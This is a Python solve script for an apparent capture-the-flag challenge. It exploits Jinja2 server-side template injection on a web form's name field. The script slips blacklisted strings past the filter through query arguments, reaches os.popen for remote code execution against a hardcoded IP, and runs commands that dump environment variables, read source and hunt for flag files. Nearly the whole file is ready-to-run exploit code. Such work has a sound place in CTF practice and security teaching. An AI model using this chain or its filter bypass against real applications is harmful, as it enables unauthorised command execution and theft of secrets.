#!/usr/bin/env python3
"""Solve Ginger Juice Shop (CITRUS STUDIO) — Jinja2 SSTI on the `name` field.

The POST body (name) is filtered by a naive substring blacklist blocking
`__`, `os`, `config`, `class`, `mro`, `subclasses`, `eval`, `exec`, ... but
query-string arguments are NOT filtered, and Jinja2 string escapes are honoured.

Chain:  lipsum|attr(request.args.g)  ->  jinja2.utils module globals
        [request.args.m]             ->  the `os` module
        .popen(cmd)                  ->  pipe
        |attr('read')()              ->  stdout

Usage: python3 solve.py [http://target:port]
"""
import re
import sys

import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8050"

# Query args carry the blacklisted substrings; they bypass the body filter.
PARAMS = {
    "g": "__globals__",   # attribute of the lipsum function's module globals
    "m": "os",            # the os module inside jinja2.utils globals
}

TEMPLATE = "{{(lipsum|attr(request.args.g))[request.args.m]['popen'](request.args.c)|attr('read')()}}"

CMDS = [
    "id",
    "find / -maxdepth 4 -iname '*flag*' 2>/dev/null",
    "cat /flag.txt; cat /flag; cat /app/flag.txt; cat /app/templates/flag.txt; cat /home/*/flag*",
    "ls -la / /app /home 2>/dev/null",
    "printenv",
    "cat /app/app.py 2>/dev/null | head -200",
    "cat /proc/1/cmdline | tr '\\0' ' '",
]
FLAG_RE = re.compile(r"safctf\{[0-9a-fA-F]{32}\}")


def run(cmd):
    params = dict(PARAMS, c=cmd)
    try:
        r = requests.post(TARGET + "/", data={"name": TEMPLATE}, params=params, timeout=20)
    except Exception as e:
        return f"<net error: {e}>"
    if "Invalid input" in r.text:
        return "BLOCKED"
    m = re.search(r"<h2>Hello, (.*?) Did you find", r.text, re.S)
    if m:
        return m.group(1)
    return r.text[-400:]


def main():
    print(f"[*] target {TARGET}")
    hi = run("id")
    print(f"[*] proof of RCE: {hi.strip()[:200]!r}")
    for cmd in CMDS:
        out = run(cmd)
        print(f"\n$ {cmd}\n{out[:1500]}")
        m = FLAG_RE.search(out)
        if m:
            print(f"\n[+] FLAG: {m.group(0)}")
            return m.group(0)
    print("\n[-] no flag found in the probed locations")
    return None


if __name__ == "__main__":
    sys.exit(0 if main() else 1)
